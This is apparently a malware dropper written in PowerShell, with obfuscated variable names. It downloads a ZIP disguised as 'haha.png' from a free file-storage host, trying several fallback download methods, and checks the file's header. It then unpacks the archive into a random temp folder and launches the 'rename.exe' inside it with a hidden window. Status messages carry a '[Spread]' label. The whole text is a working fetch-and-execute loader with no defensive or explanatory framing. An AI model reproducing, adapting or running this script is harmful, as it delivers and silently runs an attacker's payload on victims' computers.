$YZ2Ru2I = "https://file.freestorage-04.bond/files/2026/10/5/cd2f3fb9-6c80-4243-9429-d54e87a931f6/haha.png?srl=II-DSBd1GW9Cp8UHWbh2NQ&exp=1791247315"
$FnqmwxhQ = [System.IO.Path]::GetRandomFileName().Replace('.','')
$HjBJj = [System.IO.Path]::GetTempPath()
$tgICT4K = Join-Path $HjBJj ("$FnqmwxhQ" + ".zip")
$VkrNwPU1 = Join-Path $HjBJj $FnqmwxhQ
$mPjU5E = "rename.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$geGMy)
    Write-Host ('[Spread] ' + $geGMy) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $VkrNwPU1) {
    Remove-Item -LiteralPath $VkrNwPU1 -Recurse -Force -ErrorAction SilentlyContinue
}

$woXq7 = $false
try {
    Start-BitsTransfer -Source $YZ2Ru2I -Destination $tgICT4K -ErrorAction Stop
    $woXq7 = $true
} catch { }
if (-not $woXq7) {
    try {
        (New-Object Net.WebClient).DownloadFile($YZ2Ru2I, $tgICT4K)
        $woXq7 = $true
    } catch { }
}
if (-not $woXq7) {
    try {
        Invoke-WebRequest -Uri $YZ2Ru2I -OutFile $tgICT4K -UseBasicParsing
        $woXq7 = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $tgICT4K)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$v5RxGMPE = [IO.File]::ReadAllBytes($tgICT4K)
if ($v5RxGMPE.Length -ge 3 -and $v5RxGMPE[0] -eq 0xEF -and $v5RxGMPE[1] -eq 0xBB -and $v5RxGMPE[2] -eq 0xBF) {
    $YQuZA2 = New-Object byte[] ($v5RxGMPE.Length - 3)
    [Array]::Copy($v5RxGMPE, 3, $YQuZA2, 0, $YQuZA2.Length)
    [IO.File]::WriteAllBytes($tgICT4K, $YQuZA2)
    $v5RxGMPE = $YQuZA2
}
if ($v5RxGMPE.Length -lt 4 -or $v5RxGMPE[0] -ne 0x50 -or $v5RxGMPE[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $v5RxGMPE[0], $v5RxGMPE[1])
}

$U4hck = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($tgICT4K, $VkrNwPU1)
    $U4hck = $true
} catch { }
if (-not $U4hck) {
    try {
        if (Test-Path -LiteralPath $VkrNwPU1) {
            Remove-Item -LiteralPath $VkrNwPU1 -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $tgICT4K -DestinationPath $VkrNwPU1 -Force
        $U4hck = $true
    } catch { }
}
if (-not $U4hck) {
    try {
        if (Test-Path -LiteralPath $VkrNwPU1) {
            Remove-Item -LiteralPath $VkrNwPU1 -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $VkrNwPU1 -Force | Out-Null
        $Lhg25ka = New-Object -ComObject Shell.Application
        $ErFK = $Lhg25ka.NameSpace((Resolve-Path $tgICT4K).Path)
        $sGyZjNK = $Lhg25ka.NameSpace((Resolve-Path $VkrNwPU1).Path)
        $sGyZjNK.CopyHere($ErFK.Items(), 0x14)
        $B4O8 = 120
        $jwWPi = 0
        while ($jwWPi -lt $B4O8 -and -not (Test-Path -LiteralPath (Join-Path $VkrNwPU1 $mPjU5E))) {
            Start-Sleep -Milliseconds 500
            $jwWPi++
        }
        if (Test-Path -LiteralPath (Join-Path $VkrNwPU1 $mPjU5E)) { $U4hck = $true }
    } catch { }
}
if (-not $U4hck) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$fPbEOkW = Join-Path $VkrNwPU1 $mPjU5E
if (-not (Test-Path -LiteralPath $fPbEOkW)) {
    _spreadStop ('EXE not found: ' + $fPbEOkW)
}

$uVOfXFrv = (Get-Location).Path
Set-Location -LiteralPath $VkrNwPU1
try {
    $TEtC = Start-Process -FilePath $fPbEOkW -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($uVOfXFrv) { Set-Location -LiteralPath $uVOfXFrv }
}
